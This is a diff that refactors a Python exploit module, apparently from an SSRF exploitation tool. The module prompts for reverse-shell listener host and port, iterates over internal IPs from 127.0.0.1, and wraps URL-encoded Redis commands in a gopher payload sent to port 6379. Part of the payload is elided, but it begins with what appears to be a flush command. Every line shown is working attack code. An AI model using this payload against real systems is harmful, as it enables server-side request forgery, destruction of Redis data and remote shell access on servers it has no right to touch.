@@ -11,22 +11,18 @@ class exploit():
     SERVER_PORT = "4242"
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
 
         # Handle args for reverse shell
-        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
-        else:                  self.SERVER_HOST = args.lhost
-
-        if args.lport == None: self.SERVER_PORT = input("Server Port:")
-        else:                  self.SERVER_PORT = args.lport
-
+        self.SERVER_HOST = input("Server Host:") if args.lhost is None else args.lhost
+        self.SERVER_PORT = input("Server Port:") if args.lport is None else args.lport
         # Using a generator to create the host list
         gen_host = gen_ip_list("127.0.0.1", args.level)
+        # Data and port for the service
+        port = "6379"
+        data = "*1%0d%0a$8%0d%0aflus[...]%0aquit%0d%0a"
         for ip in gen_host:
 
-            # Data and port for the service
-            port = "6379"
-            data = "*1%0d%0a$8%0d%0aflus[...]%0aquit%0d%0a"
             payload = wrapper_gopher(data, ip , port)
 
             # Handle args for reverse shell
